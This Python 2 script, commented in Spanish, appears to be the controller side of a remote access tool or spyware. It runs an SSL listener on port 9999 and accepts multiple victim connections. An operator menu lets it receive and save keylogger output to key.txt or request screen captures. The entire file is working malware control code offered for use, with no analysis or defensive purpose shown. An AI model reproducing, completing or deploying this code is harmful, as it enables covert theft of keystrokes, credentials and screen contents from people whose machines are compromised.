#!/usr/bin/python
# -*- coding: utf-8 -*-
#importamos el modulo socket
# -*- coding: utf-8 -*-
#import socket
from socket import socket, error
import os,socket,sys,ssl
import threading
import logging
import time
import base64

def conexion(sc,addr):
  while True:
    #Recibimos el mensaje, con el metodo recv recibimos datos y como parametro
    #la cantidad de bytes para recibir
    recibido = sc.recv(2048)
    recibido = sc.recv(2048)
    print recibido
    #Si se reciben datos nos muestra la IP y el mensaje recibido
    #print str(addr[0]) + " dice: ", recibido

    #Devolvemos el mensaje al cliente
    mensaje=str(raw_input(" "))
    print mensaje
    sc.write(mensaje)
    sc.send("\n")
    if(int(mensaje)==1):
      print "Esperando keylogger"
      saveFile("key.txt",sc,addr,0)
    if(int(mensaje)==2):
      print "Obteniendo captura...."
      ahora = time.strftime("%c")
      input_data = sc.recv(1024)
      input_data = sc.recv(1024)
      #saveFile("captura"+ahora+".jpg",sc,addr,1)


def saveFile(name,sc,addr,b):
  f = open(name, "wb")
  input_data = sc.recv(1024)
  input_data = sc.recv(1024)
  while True:
    try:
      # Recibir datos del cliente.
      if(len(input_data)>0):
        input_data += sc.recv(1024)
        print input_data
      else:
        print "termino de leer"
        break
    except error:
      print("Error de lectura.")
      break
  print input_data
  if b==1:
    dec=input_data.decode('base64')
    if isinstance(dec, bytes):
      end = dec[0] == 1
    else:
      end = dec == chr(1)
    if not end:
      # Almacenar datos.
      f.write(dec)
    #print dec
    #f.write( dec )
  else: f.write(input_data)
  print("El archivo se ha recibido correctamente.")
  f.close()

#instanciamos un objeto para trabajar con el socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
#Con el metodo bind le indicamos que puerto debe escuchar y de que servidor esperar conexiones
#Es mejor dejarlo en blanco para recibir conexiones externas si es nuestro caso
s.bind(("", 9999))
 
#Aceptamos conexiones entrantes con el metodo listen, y ademas aplicamos como parametro
#El numero de conexiones entrantes que vamos a aceptar
s.listen(100)

#Canal  cifrado 
ss=ssl.wrap_socket(s,server_side=True,keyfile="capps.key.pem",certfile="capps.cert.pem",ssl_version=ssl.PROTOCOL_SSLv23)
#Instanciamos un objeto sc (socket cliente) para recibir datos, al recibir datos este 
#devolvera tambien un objeto que representa una tupla con los datos de conexion: IP y puerto
#print sc
threads = list()
while True:
  sc, addr = ss.accept()
  t = threading.Thread(target=conexion, args=(sc,addr))
  threads.append(t)
  t.start()
 
#Cerramos la instancia del socket cliente y servidor
sc.close()
s.close()
